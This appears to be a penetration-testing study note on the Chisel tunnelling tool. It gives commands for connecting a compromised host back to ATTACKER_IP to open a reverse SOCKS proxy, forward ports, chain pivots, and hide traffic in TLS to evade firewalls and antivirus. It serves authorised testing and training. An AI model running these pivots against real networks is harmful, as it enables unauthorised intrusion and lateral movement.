---
tags: [tools, network, pivoting, tunneling, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.54 Chisel TCP Tunneling over HTTP"
---

# 59.54 Chisel TCP Tunneling over HTTP

## Overview and Core Mechanics

Chisel is a fast, robust, and highly reliable TCP/UDP tunnel, written in Go, that transports data over HTTP. It is arguably the most popular and efficient pivoting tool used in modern penetration testing for creating SOCKS5 proxies and forwarding ports deep into internal networks.

The core strength of Chisel lies in its encapsulation mechanism. It wraps standard TCP connections within an HTTP (specifically, WebSocket) connection. This allows Chisel to effortlessly bypass deeply restrictive corporate firewalls that only permit outbound web traffic (Ports 80/443). Because it uses WebSockets, the connection is persistent and bidirectional, overcoming the stateless nature of standard HTTP. Furthermore, Chisel traffic is secured via SSH protocol within the WebSocket tunnel, ensuring encryption even if you aren't using HTTPS/TLS.

Chisel operates on a Client/Server architecture. A single Chisel executable serves as both the client and the server, depending on the command-line arguments provided.

## Visual Architecture: Chisel Reverse SOCKS5 Pivot

```text
+---------------------+                            +-------------------------+                      +-----------------------+
|    Attacker Node    |                            |    Compromised Host     |                      |   Internal Network    |
|                     |                            |    (The Pivot Point)    |                      |                       |
|  [Chisel Server]    |                            |     [Chisel Client]     |                      |  +-----------------+  |
|  chisel server -p   |<==========================>| chisel client           |--------------------->|  | Target: DB Srv  |  |
|  8000 --reverse     | HTTP/WebSocket Connection  | ATTACKER_IP:8000 R:socks|  Proxying Traffic    |  | 10.0.0.50:3306  |  |
|                     | (Encapsulated SSH Tunnel)  |                         |                      |  +-----------------+  |
|  [Proxychains]      |                            |                         |                      |                       |
|  socks5 127.0.0.1   |                            |                         |                      |  +-----------------+  |
|  1080               |                            |                         |--------------------->|  | Target: Web Srv |  |
|                     |                            |                         |                      |  | 10.0.0.60:80    |  |
+---------------------+                            +-------------------------+                      +-----------------------+
```

## Detailed Installation and Setup

Because Chisel is written in Go, it compiles to a single, standalone binary with no external dependencies. This makes it incredibly easy to deploy on target systems.

### Installation on Attacker Machine
You can download pre-compiled binaries from the official GitHub releases page, or compile it from source if you have Go installed.

```bash
# Using Go
go install github.com/jpillora/chisel@latest

# Or downloading release (example for Linux x64)
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
sudo mv chisel /usr/local/bin/
```

### Deploying to the Target
You must transfer the appropriate binary (Linux or Windows) to the compromised host. Since the binaries can be slightly large (~8MB), consider compressing them using `upx` before transfer to save bandwidth and reduce the chance of timeout during transfer over unstable shells.
```bash
upx -9 chisel
```

## Syntax and Core Operations

Chisel uses the `server` and `client` subcommands.

### Chisel Server Syntax
The server is typically run on the Attacker machine to listen for incoming connections from the compromised host.
```bash
chisel server --port [PORT] --reverse
```
*   `--port [PORT]` or `-p`: The port the server listens on for incoming Chisel clients (defaults to 8080).
*   `--reverse`: **Crucial.** This allows clients to specify reverse port forwards. Without this, the client can only forward local ports to the server, not the other way around.

### Chisel Client Syntax
The client is run on the compromised host to connect back to the attacker's server and establish the tunnels.
```bash
chisel client [SERVER_IP]:[SERVER_PORT] [REMOTES...]
```
*   `[SERVER_IP]:[SERVER_PORT]`: The address of your Chisel server.
*   `[REMOTES...]`: Defines the tunneling rules.
    *   Format: `R:[REMOTE_PORT]:[LOCAL_HOST]:[LOCAL_PORT]` (Reverse Forward)
    *   Format: `[LOCAL_PORT]:[REMOTE_HOST]:[REMOTE_PORT]` (Local Forward)
    *   Format: `R:socks` (Reverse SOCKS5 Proxy)

## Comprehensive Use Cases

### 1. The Reverse SOCKS5 Proxy (The Standard Pivot)
This is the most frequent use case. You have compromised a machine and want to route all your attacking tools (Nmap, Metasploit, Burp Suite) through it to reach an internal network.

**Step 1: Start Server on Attacker Node**
```bash
chisel server -p 8000 --reverse
```

**Step 2: Connect Client from Compromised Node**
```bash
./chisel client ATTACKER_IP:8000 R:socks
```
*Analysis:* The client connects to the attacker on port 8000. The `R:socks` command tells the *server* (attacker) to open a SOCKS5 proxy listening locally. By default, Chisel opens this on port `1080`.

**Step 3: Configure Proxychains (Attacker Node)**
Edit `/etc/proxychains4.conf`. Comment out the default `socks4 127.0.0.1 9050` and add:
```text
socks5 127.0.0.1 1080
```
Now you can run tools through the tunnel: `proxychains nmap -sT -Pn 10.0.0.50`

### 2. Reverse Port Forwarding (Exposing an Internal Service)
You want to access a single internal service (e.g., an intranet web app on 10.0.0.50:80) directly on your attacker machine without using proxychains.

**Step 1: Start Server on Attacker Node**
```bash
chisel server -p 8000 --reverse
```

**Step 2: Connect Client from Compromised Node**
```bash
./chisel client ATTACKER_IP:8000 R:8080:10.0.0.50:80
```
*Analysis:* The client tells the server to listen on port `8080` (on the attacker's machine). Any traffic hitting `localhost:8080` on the attacker machine is forwarded through the tunnel to the client, which then sends it to `10.0.0.50:80`. You can now open a browser and navigate to `http://localhost:8080`.

### 3. Local Port Forwarding (Bypassing Localhost Bindings)
Suppose you compromise a server running a MySQL database that is heavily firewalled and only bound to `localhost:3306`. You want to connect to it from your attacker machine using your local SQL client.

*(Note: While reverse port forwarding also solves this, local forwarding is useful if you run the server on the target and client on your attacker machine, which is rare but possible).*

**Step 1: Start Server on Compromised Node**
```bash
./chisel server -p 8000
```

**Step 2: Connect Client from Attacker Node**
```bash
chisel client TARGET_IP:8000 3306:127.0.0.1:3306
```
*Analysis:* The client (attacker) listens locally on port 3306. Traffic is sent to the server (target), which forwards it to `127.0.0.1:3306` on itself.

## Advanced Techniques and Optimizations

### Double Pivoting (Chaining Tunnels)
Chisel excels at creating "tunnels within tunnels" to reach deeply segmented networks (e.g., Attacker -> DMZ -> Internal -> Secure Segment).

1.  Setup a Chisel Server on the Attacker.
2.  Run Chisel Client on Pivot 1 (DMZ) back to Attacker creating SOCKS on 1080.
3.  Configure `proxychains` to use `1080`.
4.  Run a *second* Chisel Server on the Attacker, listening on a different port (e.g., 8001).
5.  Upload Chisel to Pivot 2 (Internal).
6.  Use proxychains to execute the Chisel client on Pivot 2, connecting back *through* Pivot 1 to the second server on the Attacker.
    ```bash
    proxychains ssh user@pivot2 "./chisel client ATTACKER_IP:8001 R:socks"
    ```
    This creates a new SOCKS proxy on the attacker machine (e.g., port 1081) that routes traffic through Pivot 1 to Pivot 2.

### Evasion via Port Selection and TLS
Corporate firewalls often perform Deep Packet Inspection (DPI) and block non-TLS traffic on port 443, or block non-HTTP traffic on port 80.
Because Chisel uses WebSockets (which starts as HTTP), running the Chisel server on port 80 or 443 makes it incredibly stealthy. To blend in perfectly, you can configure Chisel to use real TLS certificates.

**Server Setup with TLS:**
```bash
chisel server -p 443 --reverse --tls-key domain.key --tls-cert domain.crt
```
Now, network defense tools see legitimate TLS encrypted WebSocket traffic to your domain.

## Defensive Evasion and Considerations

1.  **Binary Footprint:** Uncompressed Chisel binaries are large. Using UPX compression helps, but some advanced Antivirus solutions flag heavily packed UPX binaries automatically.
2.  **Network Signatures:** While Chisel traffic is wrapped in SSH/WebSockets, the *behavior* of the traffic (long-lived, persistent connection with massive data transfer bursts) can trigger heuristic network alerts.
3.  **Proxychains Limitations:** When using Chisel as a SOCKS proxy, remember that Proxychains only forwards TCP traffic. ICMP (ping) and UDP traffic will not traverse the tunnel unless specifically configured with tools that support SOCKS5 UDP relay (Proxychains does not). For full Layer 3/TCP/UDP/ICMP pivoting, see [[55 - Ligolo-ng Layer 3 Pivot Tool]].

## Troubleshooting Common Issues

*   **"Connection refused" when testing SOCKS proxy:** Ensure the Chisel Server was started with the `--reverse` flag. If it wasn't, the client cannot request the server to open the SOCKS port.
*   **Tools hanging when using Proxychains:** Ensure you are using `-sT` (TCP Connect scan) in Nmap. SYN scans (`-sS`) require raw packet creation, which proxychains cannot handle. Also, ensure DNS requests aren't leaking and timing out; uncomment `proxy_dns` in `/etc/proxychains4.conf`.
*   **Client fails to connect to Server:** Verify firewall rules on the Attacker node allow inbound connections on the specified port. Also, check if the compromised host requires an explicit HTTP proxy to reach the internet. Chisel respects standard `HTTP_PROXY` environment variables.

## Chaining Opportunities

1.  **Exploitation -> Chisel:** Drop Chisel onto the target post-exploitation to establish a foothold into the internal network.
2.  **Chisel -> [[02 - Nmap Network Mapper]]:** Route Nmap (using TCP connect scans) through proxychains to map the internal network.
3.  **Chisel -> [[35 - CrackMapExec / NetExec]]:** Route CME/NetExec through the proxy to perform Active Directory enumeration and lateral movement across internal subnets.

## Related Notes
*   [[55 - Ligolo-ng Layer 3 Pivot Tool]]
*   [[53 - Socat Advanced Netcat Replacement]]
*   [[22 - Proxychains and Proxy Configurations]]
*   [[42 - Lateral Movement Techniques]]
*   [[02 - Nmap Network Mapper]]
